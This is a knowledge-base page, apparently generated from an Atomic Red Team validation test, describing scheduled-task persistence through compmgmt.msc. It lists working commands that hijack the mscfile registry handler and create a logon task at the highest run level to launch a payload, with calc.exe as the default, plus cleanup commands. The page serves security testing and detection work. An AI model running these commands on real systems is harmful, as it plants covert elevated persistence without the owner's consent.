---
atomic_guid: "8fcfa3d5-ea7d-4e1c-bd3e-3c4ed315b7d2"
title: "Scheduled Task Persistence via CompMgmt.msc"
framework: "atomic"
generated: "true"
attack_technique_id: "T1053.005"
attack_technique_name: "Scheduled Task/Job: Scheduled Task"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.yaml"
build_date: "2026-04-26 17:02:12"
executor: "command_prompt"
aliases:
  - "8fcfa3d5-ea7d-4e1c-bd3e-3c4ed315b7d2"
  - "Scheduled Task Persistence via CompMgmt.msc"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Scheduled Task Persistence via CompMgmt.msc

Adds persistence by abusing `compmgmt.msc` via a scheduled task.
When the Computer Management console is opened, it will run a malicious payload (in this case, `calc.exe`). 
This technique abuses scheduled tasks and registry modifications to hijack legitimate system processes.

## Metadata

- Atomic GUID: 8fcfa3d5-ea7d-4e1c-bd3e-3c4ed315b7d2
- Technique: T1053.005: Scheduled Task/Job: Scheduled Task
- Platforms: windows
- Executor: command_prompt
- Elevation Required: True
- Source Path: atomics/T1053.005/T1053.005.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1053-scheduled_task_job|T1053.005]]

## Input Arguments

### payload

- description: Command you want the task to execute
- type: string
- default: calc.exe

### task_name

- description: Name of the newly-created scheduled task
- type: string
- default: CompMgmtBypass

## Executor

- elevation_required: True
- name: command_prompt

### Command

```cmd
reg add "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command" /ve /t REG_EXPAND_SZ /d "c:\windows\System32\#{payload}" /f
schtasks /Create /TN "#{task_name}" /TR "compmgmt.msc" /SC ONLOGON /RL HIGHEST /F
ECHO Let's open the Computer Management console now...
compmgmt.msc
```

### Cleanup

```cmd
reg delete "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command" /f
schtasks /Delete /TN "#{task_name}" /F
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.yaml)
